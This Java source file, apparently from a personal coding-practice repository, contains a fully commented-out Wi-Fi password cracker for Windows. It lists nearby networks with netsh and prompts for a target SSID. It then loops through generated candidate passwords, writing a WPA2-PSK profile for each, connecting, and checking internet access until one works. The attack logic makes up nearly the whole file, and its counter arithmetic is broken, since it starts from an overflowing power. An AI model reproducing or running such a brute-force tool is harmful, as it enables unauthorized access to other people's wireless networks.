package com.leetcode.y2021.m10.wlan;

//import sun.net.www.URLConnection;
//import sun.net.www.protocol.http.HttpURLConnection;
//
//import java.io.BufferedReader;
//import java.io.File;
//import java.io.FileNotFoundException;
//import java.io.FileOutputStream;
//import java.io.IOException;
//import java.io.InputStreamReader;
//import java.io.OutputStreamWriter;
//import java.io.PrintWriter;
//import java.io.UnsupportedEncodingException;
//import java.net.URL;
//import java.util.ArrayList;
//import java.util.List;
//import java.util.Scanner;

/**
 * @author duwenlei
 **/
public class CrackWlan {
//    //密码可能会包含的字符集合
//    private static char[] fullCharSource = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
//            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
//            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
//             '!', '@', '#', '$', '%', '^', '&', '_', '+','?', ';', ',', '.', '/', '-', '='};
//    //将可能的密码集合长度
//    private static int fullCharLength = fullCharSource.length;
//
//    public static void main(String[] args) throws IOException {
//        try {
//            Process exec = Runtime.getRuntime().exec("netsh wlan show networks mode=bssid");
//            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream(), "GBK"));
//
//            List<String> result = new ArrayList<>();
//            String line;
//            while ((line = bufferedReader.readLine()) != null) {
//                result.add(line);
//            }
//
//            result.stream().forEach(System.out::println);
//            bufferedReader.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//
//        Scanner sc = new Scanner(System.in);
//        System.out.print("请输入要破解的 WIFI 名称：");
//        String wifiName = sc.next();
//        System.out.println("开始尝试破解 wifi 名称为【" + wifiName + "】的热点。");
//
//
//        // ------------ 开始破解 --------------
//
//        try {
//            // * 循环生成的密码
//
//            // * 1. 生成密码库
//            int maxLength = 12;
//            //PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream("D://密码字典.txt"), "utf-8"));
//
//            //计数器，多线程时可以对其加锁，当然得先转换成Integer类型。
//            long counter = (long) Math.pow(fullCharLength,80);
//            StringBuilder buider = new StringBuilder();
//            // 记录次数
//            long count = 0;
//            while (buider.toString().length() <= maxLength) {
//                count++;
//                buider = new StringBuilder(maxLength * 2);
//                long _counter = counter;
//                //10进制转换成26进制
//                while (_counter >= fullCharLength) {
//                    //获得低位
//                    buider.insert(0, fullCharSource[(int) (_counter % fullCharLength)]);
//                    _counter = _counter / fullCharLength;
//                    //处理进制体系中只有10没有01的问题，在穷举里面是可以存在01的
//                    _counter--;
//                }
//                //最高位
//                buider.insert(0, fullCharSource[(int) _counter]);
//                counter++;
//
//                // 写入到文件中
//                //pw.write(buider + "\n");
//
//                if (buider.length()<8){
//                    continue;
//                }
//
//                // 循环密码，进行破解********************************start***************************************
//                String wifiPwd = buider.toString();
//
//                // 1. 生成 wifi xml 文件
//                String ssidHex = str2HexStr(wifiName);
//                String wifiXml = genWifiXml(wifiName, ssidHex, wifiPwd);
//
//                // 2. 写入本地项目中
//                File tempXmlFile = new File("temp" + count + ".xml");
//                try {
//                    FileOutputStream outputStream = new FileOutputStream(tempXmlFile);
//                    outputStream.write(wifiXml.getBytes());
//                    outputStream.flush();
//                    outputStream.close();
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//
//                // 3. 增加配置文件
//                Process process = Runtime.getRuntime().exec("netsh wlan add profile filename=temp" + count + ".xml", null, new File("./"));
//                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
//                String line;
//                while ((line = reader.readLine()) != null) {
//                    System.out.println(line);
//                }
//                reader.close();
//                process.destroy();
//
//                // 4. 连接 "netsh wlan connect name=\""+ssid+"\"","./"
//                Process process1 = Runtime.getRuntime().exec("netsh wlan connect name=\"" + wifiName + "\"", null, new File("./"));
//                BufferedReader reader1 = new BufferedReader(new InputStreamReader(process1.getInputStream(), "GBK"));
//                String line1;
//                while ((line1 = reader1.readLine()) != null) {
//                    System.out.println(line1);
//                }
//                reader1.close();
//                process1.destroy();
//
//                try {
//                    Thread.sleep(2000);
//                } catch (InterruptedException e) {
//                    e.printStackTrace();
//                }
//                // 检查联网情况
//                try {
//                    URL url = new URL("http://www.bing.com");
//                    HttpURLConnection connection = new HttpURLConnection(url, null);
//                    connection.connect();
//                    if (connection.getResponseCode() == 200) {
//                        System.out.println("wifi 连接成功");
//                        System.out.println("wifi ssid = " + wifiName);
//                        System.out.println("wifi pwd = " + wifiPwd);
//                        return;
//                    } else {
//                        System.out.println("wifi 连接失败，【" + count + "】次");
//                    }
//                    // 删除配置文件
//                    if (tempXmlFile.exists()) {
//                        tempXmlFile.delete();
//                    }
//                } catch (Exception ew) {
//                    System.out.println("wifi 连接失败，【" + count + "】次");
//                } finally {
//                    // 删除配置文件
//                    if (tempXmlFile.exists()) {
//                        tempXmlFile.delete();
//                    }
//                }
//                // 循环密码，进行破解**********************************end*************************************
//            }
//        } catch (Exception e) {
//            System.out.println("wifi连接失败：" + e.getMessage());
//            e.printStackTrace();
//        }
//    }
//
//
//    /**
//     * 获得wifi配置文件字符串
//     *
//     * @param wifiName
//     * @param hex
//     * @param wifiPwd
//     * @return
//     */
//    public static String genWifiXml(String wifiName, String hex, String wifiPwd) {
//        return "<?xml version=\"1.0\"?>" +
//                "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">" +
//                "<name>" + wifiName + "</name>" +
//                "<SSIDConfig>" +
//                "<SSID>" +
//                "<hex>" + hex + "</hex>" +
//                "<name>" + wifiName + "</name>" +
//                "</SSID>" +
//                "</SSIDConfig>" +
//                "<connectionType>ESS</connectionType>" +
//                "<connectionMode>auto</connectionMode>" +
//                "<MSM>" +
//                "<security>" +
//                "<authEncryption>" +
//                "<authentication>WPA2PSK</authentication>" +
//                "<encryption>AES</encryption>" +
//                "<useOneX>false</useOneX>" +
//                "</authEncryption>" +
//                "<sharedKey>" +
//                "<keyType>passPhrase</keyType>" +
//                "<protected>false</protected>" +
//                "<keyMaterial>" + wifiPwd + "</keyMaterial>" +
//                "</sharedKey>" +
//                "</security>" +
//                "</MSM>" +
//                "<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">" +
//                "<enableRandomization>false</enableRandomization>" +
//                "</MacRandomization>" +
//                "</WLANProfile>";
//    }
//
//    /**
//     * 字符串转换成为16进制(无需Unicode编码)
//     *
//     * @param str
//     * @return
//     */
//    public static String str2HexStr(String str) {
//        char[] chars = "0123456789ABCDEF".toCharArray();
//        StringBuilder sb = new StringBuilder("");
//        byte[] bs = str.getBytes();
//        int bit;
//        for (int i = 0; i < bs.length; i++) {
//            bit = (bs[i] & 0x0f0) >> 4;
//            sb.append(chars[bit]);
//            bit = bs[i] & 0x0f;
//            sb.append(chars[bit]);
//        }
//        return sb.toString().trim();
//    }
//
//    //maxLength：生成的字符串的最大长度
//    public static void generate(int maxLength) throws FileNotFoundException, UnsupportedEncodingException {
//        //计数器，多线程时可以对其加锁，当然得先转换成Integer类型。
//        int counter = 0;
//        StringBuilder buider = new StringBuilder();
//
//        PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream("D://密码字典.txt"), "utf-8"));
//
//        while (buider.toString().length() <= maxLength) {
//            buider = new StringBuilder(maxLength * 2);
//            int _counter = counter;
//            //10进制转换成26进制
//            while (_counter >= fullCharLength) {
//                //获得低位
//                buider.insert(0, fullCharSource[_counter % fullCharLength]);
//                _counter = _counter / fullCharLength;
//                //处理进制体系中只有10没有01的问题，在穷举里面是可以存在01的
//                _counter--;
//            }
//            //最高位
//            buider.insert(0, fullCharSource[_counter]);
//            counter++;
//
//            // 写入到文件中
//            //pw.write(buider + "\n");
//
//            // 循环密码，进行破解
//
//        }
//    }
}
